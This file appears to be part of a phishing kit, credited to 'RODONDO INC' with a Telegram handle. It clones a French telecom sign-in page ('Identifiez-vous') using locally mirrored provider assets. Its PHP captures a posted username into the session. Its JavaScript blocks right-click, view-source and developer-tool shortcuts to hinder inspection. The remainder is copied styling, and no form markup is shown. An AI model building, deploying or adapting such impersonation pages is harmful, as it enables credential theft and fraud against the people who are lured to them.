<?php
//By RODONDO INC//
//telegram : @rodondo1er//


 require_once "function.php";


  if(isset($_POST['username'])){
    $username  = $_POST['username'];
    session_start();
    $_SESSION['username']=$username;

  }


?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
<meta charSet="utf-8"/>
<meta name="viewport" content="initial-scale=1.0, width=device-width"/>
<meta name="format-detection" content="telephone=no,email=no"/>
<meta name="msapplication-config" content="none"/>
<link rel="apple-touch-icon" sizes="57x57" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/apple-touch-icon-57x57.png"/><link rel="apple-touch-icon" sizes="60x60" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/apple-touch-icon-60x60.png"/><link rel="apple-touch-icon" sizes="72x72" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/apple-touch-icon-72x72.png"/><link rel="apple-touch-icon" sizes="76x76" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/apple-touch-icon-76x76.png"/><link rel="apple-touch-icon" sizes="114x114" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/apple-touch-icon-114x114.png"/>
<link rel="apple-touch-icon" sizes="120x120" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/apple-touch-icon-120x120.png"/>
<link rel="apple-touch-icon" sizes="144x144" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/apple-touch-icon-144x144.png"/>
<link rel="apple-touch-icon" sizes="152x152" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/apple-touch-icon-152x152.png"/>
<link rel="apple-touch-icon" sizes="180x180" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/apple-touch-icon-180x180.png"/>
<link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/favicon-32x32.png" sizes="32x32"/><link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/favicon-194x194.png" sizes="194x194"/><link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/favicon-96x96.png" sizes="96x96"/><link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/android-chrome-36x36.png" sizes="36x36"/>
<link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/android-chrome-48x48.png" sizes="48x48"/>
<link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/android-chrome-72x72.png" sizes="72x72"/>
<link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/android-chrome-96x96.png" sizes="96x96"/>
<link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/android-chrome-144x144.png" sizes="144x144"/>
<link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/android-chrome-192x192.png" sizes="192x192"/>
<link rel="icon" type="image/png" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/icons/favicon-16x16.png" sizes="16x16"/><title>Identifiez-vous</title>
<meta name="next-head-count" content="24"/>
<link rel="preload" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/css/c471d9ac2eae46e5.css" as="style"/>
<link rel="stylesheet" href="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/css/c471d9ac2eae46e5.css" data-n-g=""/>
<noscript data-n-css=""></noscript>
<script defer="" nomodule="" src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script>
<script src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/chunks/webpack-97b6e0a2140bd49a.js" defer=""></script>
<script src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/chunks/framework-5f4595e5518b5600.js" defer=""></script>
<script src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/chunks/main-bef50b518b880ebb.js" defer=""></script>
<script src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/chunks/pages/_app-1db4cc61610da4b6.js" defer=""></script>
<script src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/chunks/435-c64827d6dde5cd19.js" defer=""></script>
<script src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/chunks/pages/index-1049b166ac9903ec.js" defer=""></script>
<script src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/0d83c7cd1b0ffe7266db6d9830aa6ff8291d92bb/_buildManifest.js" defer=""></script>
<script src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/0d83c7cd1b0ffe7266db6d9830aa6ff8291d92bb/_ssgManifest.js" defer=""></script>
<script src="./cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-1.29.3/_next/static/0d83c7cd1b0ffe7266db6d9830aa6ff8291d92bb/_middlewareManifest.js" defer=""></script>

<script language="JavaScript">
window.onload = function () {
document.addEventListener("contextmenu", function (e) {
e.preventDefault();
}, false);
document.addEventListener("keydown", function (e) {
//document.onkeydown = function(e) {
//"I" key
if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
disabledEvent(e);
}
//"J" key
if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
disabledEvent(e);
}
//"S" key + macOS
if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
disabledEvent(e);
}
//"U" key
if (e.ctrlKey && e.keyCode == 85) {
disabledEvent(e);
}
//"F12" key
if (event.keyCode == 123) {
disabledEvent(e);
}
}, false);
function disabledEvent(e) {
if (e.stopPropagation) {
e.stopPropagation();
} else if (window.event) {
window.event.cancelBubble = true;
}
e.preventDefault();
return false;
}
}
//edit: removed ";" from last "}" because of javascript error
</script>

<style data-styled="" data-styled-version="5.3.1">.kQqXSo{font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:700;font-size:1rem;line-height:1.375rem;padding:0.8125rem 2.8125rem 0.8125rem 2.8125rem;max-width:18.75rem;border-style:solid;border-width:0.0625rem;border-color:#000;border-radius:0rem;background-color:#000;color:#FFF;vertical-align:middle;overflow:hidden;-webkit-transition:border-color .2s ease-in-out,background-color .2s ease-in-out,color .2s ease-in-out,outline-offset .2s ease-in-out;transition:border-color .2s ease-in-out,background-color .2s ease-in-out,color .2s ease-in-out,outline-offset .2s ease-in-out;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;outline-offset:0.25rem;margin-bottom:0.9375rem;}/*!sc*/
.kQqXSo:not(:disabled){cursor:pointer;}/*!sc*/
.kQqXSo:hover,.kQqXSo:focus{border-color:#555;background-color:#555;color:#FFF;}/*!sc*/
.kQqXSo:focus{outline:0.125rem solid #F16E00;outline-offset:0;}/*!sc*/
.kQqXSo:active{border-color:#F16E00;background-color:#F16E00;color:#FFF;}/*!sc*/
.kQqXSo:disabled{border-color:#CCC;background-color:#CCC;color:#FFF;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){.kQqXSo{margin-bottom:0rem;}}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g7[id="sc-gKseQn"]{content:"kQqXSo,"}/*!sc*/
.kBrEOE{display:inline-block;cursor:pointer;font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:700;font-size:0.875rem;line-height:1.25rem;padding:0.5rem 0rem 0.625rem 0rem;background-color:#FFF;color:#000;-webkit-text-decoration:none;text-decoration:none;max-width:18.75rem;margin-top:auto;}/*!sc*/
.kBrEOE svg{position:relative;top:1px;margin:0rem -0.125rem 0rem 0.375rem;}/*!sc*/
.kBrEOE svg path{fill:#F16E00;}/*!sc*/
.kBrEOE:hover,.kBrEOE:focus{color:#555;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration-color:#555;text-decoration-color:#555;}/*!sc*/
.kBrEOE:hover svg path,.kBrEOE:focus svg path{fill:#F16E00;}/*!sc*/
.kBrEOE:active{color:#F16E00;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration-color:#F16E00;text-decoration-color:#F16E00;}/*!sc*/
.kBrEOE:active svg path{fill:#F16E00;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.emkpOy{display:inline-block;cursor:pointer;font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:700;font-size:1rem;line-height:1.375rem;padding:0.4375rem 0rem 0.625rem 0rem;background-color:#FFF;color:#000;-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
.emkpOy svg{position:relative;top:1px;margin:0rem -0.125rem 0rem 0.5rem;}/*!sc*/
.emkpOy svg path{fill:#F16E00;}/*!sc*/
.emkpOy:hover,.emkpOy:focus{color:#555;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration-color:#555;text-decoration-color:#555;}/*!sc*/
.emkpOy:hover svg path,.emkpOy:focus svg path{fill:#F16E00;}/*!sc*/
.emkpOy:active{color:#F16E00;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration-color:#F16E00;text-decoration-color:#F16E00;}/*!sc*/
.emkpOy:active svg path{fill:#F16E00;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){.emkpOy{margin-left:1.875rem;}}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.dmteRn{display:inline-block;cursor:pointer;font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:700;font-size:0.875rem;line-height:1.25rem;padding:0.5rem 0rem 0.625rem 0rem;background-color:#FFF;color:#000;-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
.dmteRn svg{position:relative;top:1px;margin:0rem -0.125rem 0rem 0.375rem;}/*!sc*/
.dmteRn svg path{fill:#F16E00;}/*!sc*/
.dmteRn:hover,.dmteRn:focus{color:#555;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration-color:#555;text-decoration-color:#555;}/*!sc*/
.dmteRn:hover svg path,.dmteRn:focus svg path{fill:#F16E00;}/*!sc*/
.dmteRn:active{color:#F16E00;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration-color:#F16E00;text-decoration-color:#F16E00;}/*!sc*/
.dmteRn:active svg path{fill:#F16E00;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g9[id="sc-fubCzh"]{content:"kBrEOE,emkpOy,dmteRn,"}/*!sc*/
.gwIoSy{margin:0;color:#000;font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:400;font-size:0.875rem;line-height:1.25rem;padding:0.5rem 0rem 0.625rem 0rem;}/*!sc*/
.gwIoSy strong{font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:700;}/*!sc*/
@media (min-width:480px){.gwIoSy{font-size:0.875rem;line-height:1.25rem;padding:0.5rem 0rem 0.625rem 0rem;}}/*!sc*/
@media (min-width:1200px){.gwIoSy{font-size:1rem;line-height:1.375rem;padding:0.4375rem 0rem 0.625rem 0rem;}}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.icGWoC{margin:0;color:#000;font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:400;font-size:1rem;line-height:1.375rem;padding:0.4375rem 0rem 0.625rem 0rem;}/*!sc*/
.icGWoC strong{font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:700;}/*!sc*/
@media (min-width:480px){.icGWoC{font-size:1rem;line-height:1.375rem;padding:0.4375rem 0rem 0.625rem 0rem;max-width:37.5rem;}}/*!sc*/
@media (min-width:1200px){.icGWoC{font-size:1.125rem;line-height:1.5rem;padding:0.375rem 0rem 0.625rem 0rem;max-width:43.75rem;}}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g20[id="sc-fFucqa"]{content:"gwIoSy,icGWoC,"}/*!sc*/
.goejzw{margin:0 auto;width:100%;max-width:90rem;padding-right:0.9375rem;padding-left:0.9375rem;margin-top:3.75rem;}/*!sc*/
@media (min-width:480px){.goejzw{padding-right:0.9375rem;padding-left:0.9375rem;}}/*!sc*/
@media (min-width:736px){.goejzw{padding-right:calc(0.9375rem + 1.5625%);padding-left:calc(0.9375rem + 1.5625%);}}/*!sc*/
@media (min-width:960px){.goejzw{padding-right:calc(0.9375rem + 3.125%);padding-left:calc(0.9375rem + 3.125%);}}/*!sc*/
@media (min-width:1200px){.goejzw{padding-right:calc(0.9375rem + 3.125%);padding-left:calc(0.9375rem + 3.125%);}}/*!sc*/
@media (min-width:1440px){.goejzw{padding-right:3.75rem;padding-left:3.75rem;}}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.eVuhrR{margin:0 auto;width:100%;max-width:90rem;padding-right:0.9375rem;padding-left:0.9375rem;margin-top:0.9375rem;margin-bottom:1.875rem;}/*!sc*/
@media (min-width:480px){.eVuhrR{padding-right:0.9375rem;padding-left:0.9375rem;}}/*!sc*/
@media (min-width:736px){.eVuhrR{padding-right:calc(0.9375rem + 1.5625%);padding-left:calc(0.9375rem + 1.5625%);}}/*!sc*/
@media (min-width:960px){.eVuhrR{padding-right:calc(0.9375rem + 3.125%);padding-left:calc(0.9375rem + 3.125%);}}/*!sc*/
@media (min-width:1200px){.eVuhrR{padding-right:calc(0.9375rem + 3.125%);padding-left:calc(0.9375rem + 3.125%);}}/*!sc*/
@media (min-width:1440px){.eVuhrR{padding-right:3.75rem;padding-left:3.75rem;}}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){.eVuhrR{margin-top:1.875rem;margin-bottom:3.75rem;}}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.cNHdgz{margin:0 auto;width:100%;max-width:90rem;padding-right:0.9375rem;padding-left:0.9375rem;margin-top:auto;margin-bottom:0.9375rem;}/*!sc*/
@media (min-width:480px){.cNHdgz{padding-right:0.9375rem;padding-left:0.9375rem;}}/*!sc*/
@media (min-width:736px){.cNHdgz{padding-right:calc(0.9375rem + 1.5625%);padding-left:calc(0.9375rem + 1.5625%);}}/*!sc*/
@media (min-width:960px){.cNHdgz{padding-right:calc(0.9375rem + 3.125%);padding-left:calc(0.9375rem + 3.125%);}}/*!sc*/
@media (min-width:1200px){.cNHdgz{padding-right:calc(0.9375rem + 3.125%);padding-left:calc(0.9375rem + 3.125%);}}/*!sc*/
@media (min-width:1440px){.cNHdgz{padding-right:3.75rem;padding-left:3.75rem;}}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g23[id="sc-dIUeWJ"]{content:"goejzw,eVuhrR,cNHdgz,"}/*!sc*/
.dGQOgo{padding-right:0.9375rem;padding-left:0.9375rem;-webkit-flex:0 0 66.66666666666666%;-ms-flex:0 0 66.66666666666666%;flex:0 0 66.66666666666666%;max-width:66.66666666666666%;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.dlOwtk{padding-right:0.9375rem;padding-left:0.9375rem;-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){.dlOwtk{-webkit-flex:0 0 58.333333333333336%;-ms-flex:0 0 58.333333333333336%;flex:0 0 58.333333333333336%;max-width:58.333333333333336%;}}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){.dlOwtk{-webkit-flex:0 0 66.66666666666666%;-ms-flex:0 0 66.66666666666666%;flex:0 0 66.66666666666666%;max-width:66.66666666666666%;}}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.Oatvs{padding-right:0.9375rem;padding-left:0.9375rem;-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.hxOZPk{padding-right:0.9375rem;padding-left:0.9375rem;-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){.hxOZPk{-webkit-flex:0 0 85.71428571428571%;-ms-flex:0 0 85.71428571428571%;flex:0 0 85.71428571428571%;max-width:85.71428571428571%;}}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g24[id="sc-hHfuMS"]{content:"dGQOgo,dlOwtk,Oatvs,hxOZPk,"}/*!sc*/
.hBjXL{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-0.9375rem;margin-left:-0.9375rem;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.TofCC{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-0.9375rem;margin-left:-0.9375rem;margin-top:0.9375rem;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.jWBqYs{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-0.9375rem;margin-left:-0.9375rem;margin-top:0.9375rem;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){.jWBqYs{margin-top:1.875rem;}}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.fMDtdW{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-0.9375rem;margin-left:-0.9375rem;margin-top:0rem;margin-bottom:0.9375rem;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){.fMDtdW{margin-top:0.9375rem;margin-bottom:1.875rem;}}/*!sc*/
@media (min-width:1440px){}/*!sc*/
.hKGhtm{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-0.9375rem;margin-left:-0.9375rem;margin-bottom:0.9375rem;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g25[id="sc-dmlqKv"]{content:"hBjXL,TofCC,jWBqYs,fMDtdW,hKGhtm,"}/*!sc*/
.beLFGA{font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:700;font-size:1.625rem;line-height:1.875rem;color:#000;margin:0;padding:0.25rem 0rem 0.625rem 0rem;}/*!sc*/
@media (min-width:736px){.beLFGA{font-size:2.125rem;line-height:2.5rem;padding:0rem 0rem 0.5rem 0rem;max-width:50rem;}}/*!sc*/
@media (min-width:1200px){.beLFGA{font-size:2.625rem;line-height:3.125rem;padding:0rem 0rem 0.375rem 0rem;max-width:62.5rem;}}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g26[id="sc-kfzBvY"]{content:"beLFGA,"}/*!sc*/
.bctpvp{height:1px;background-color:#CCC;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g42[id="sc-cBNeex"]{content:"bctpvp,"}/*!sc*/
.esznbg{position:relative;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;}/*!sc*/
data-styled.g65[id="sc-ehSDrC"]{content:"esznbg,"}/*!sc*/
.hyhGxP{position:absolute;left:0;top:0;width:100%;height:100%;padding:0;opacity:0;margin:0;cursor:pointer;}/*!sc*/
.hyhGxP ~ div{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;width:1.25rem;height:1.25rem;border-radius:0rem;outline-offset:0.25rem;-webkit-transition:outline-offset .2s ease-in-out;transition:outline-offset .2s ease-in-out;}/*!sc*/
.hyhGxP:enabled:not(:checked) ~ div{padding:0.25rem 0.25rem 0.25rem 0.25rem;border:0.0625rem solid #000;background-color:transparent;}/*!sc*/
.hyhGxP:enabled:not(:checked):hover ~ div,.hyhGxP:enabled:not(:checked).focus-visible ~ div{padding:0.25rem 0.25rem 0.25rem 0.25rem;border:0.0625rem solid #555;background-color:transparent;}/*!sc*/
.hyhGxP:enabled:not(:checked).focus-visible ~ div{outline:0.125rem solid #F16E00;outline-offset:0;}/*!sc*/
.hyhGxP:enabled:not(:checked):active ~ div{padding:0.1875rem 0.1875rem 0.1875rem 0.1875rem;border:0.125rem solid #555;background-color:transparent;}/*!sc*/
.hyhGxP:enabled:checked ~ div{padding:0.1875rem 0.1875rem 0.1875rem 0.1875rem;border:0.125rem solid #F16E00;background-color:transparent;}/*!sc*/
.hyhGxP:enabled:checked ~ div svg > path{fill:#F16E00;}/*!sc*/
.hyhGxP:enabled:checked:hover ~ div,.hyhGxP:enabled:checked.focus-visible ~ div{padding:0.1875rem 0.1875rem 0.1875rem 0.1875rem;border:0.125rem solid #555;background-color:transparent;}/*!sc*/
.hyhGxP:enabled:checked:hover ~ div svg > path,.hyhGxP:enabled:checked.focus-visible ~ div svg > path{fill:#555;}/*!sc*/
.hyhGxP:enabled:checked.focus-visible ~ div{outline:0.125rem solid #F16E00;outline-offset:0;}/*!sc*/
.hyhGxP:enabled:checked:active ~ div{padding:0.25rem 0.25rem 0.25rem 0.25rem;border:0.0625rem solid #555;background-color:transparent;}/*!sc*/
.hyhGxP:enabled:checked:active ~ div svg > path{fill:#555;}/*!sc*/
.hyhGxP:disabled:not(:checked) ~ div{padding:0.25rem 0.25rem 0.25rem 0.25rem;border:0.0625rem solid #CCC;background-color:transparent;}/*!sc*/
.hyhGxP:disabled:checked ~ div{padding:0.1875rem 0.1875rem 0.1875rem 0.1875rem;border:0.125rem solid #CCC;background-color:transparent;}/*!sc*/
.hyhGxP:disabled:checked ~ div svg > path{fill:#CCC;}/*!sc*/
.hyhGxP:disabled{cursor:not-allowed;}/*!sc*/
data-styled.g66[id="sc-lcuiOb"]{content:"hyhGxP,"}/*!sc*/
.khnlHi{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;max-width:28.125rem;padding:0.5625rem 0rem 0.8125rem 0rem;}/*!sc*/
.khnlHi > span:first-child{margin:0rem 0.9375rem 0rem 0rem;top:0.125rem;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g68[id="sc-clsFYl"]{content:"khnlHi,"}/*!sc*/
.kzMgSW{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex:initial;-ms-flex:initial;flex:initial;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}/*!sc*/
data-styled.g69[id="sc-fbkiRW"]{content:"kzMgSW,"}/*!sc*/
.fosVUp{font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:400;font-size:1rem;line-height:1.375rem;color:#000;margin:0.3125rem 0rem 0.3125rem 0rem;cursor:pointer;}/*!sc*/
data-styled.g70[id="sc-GqePz"]{content:"fosVUp,"}/*!sc*/
.idlwDB{position:relative;max-width:28.125rem;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g73[id="sc-TmdmN"]{content:"idlwDB,"}/*!sc*/
.hkhjAv{position:absolute;top:0;display:inline-block;width:100%;margin:0;padding:2.1875rem 3.375rem 0.8125rem 0rem;font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:400;font-size:1rem;line-height:1.375rem;color:#555;-webkit-transition:all 200ms;transition:all 200ms;}/*!sc*/
.hkhjAv svg{position:absolute;top:2.125rem;right:0.9375rem;}/*!sc*/
.hkhjAv svg path{fill:#555;}/*!sc*/
.hkhjAv svg:focus,.hkhjAv svg:active{outline-offset:6px;}/*!sc*/
data-styled.g74[id="sc-jHVedQ"]{content:"hkhjAv,"}/*!sc*/
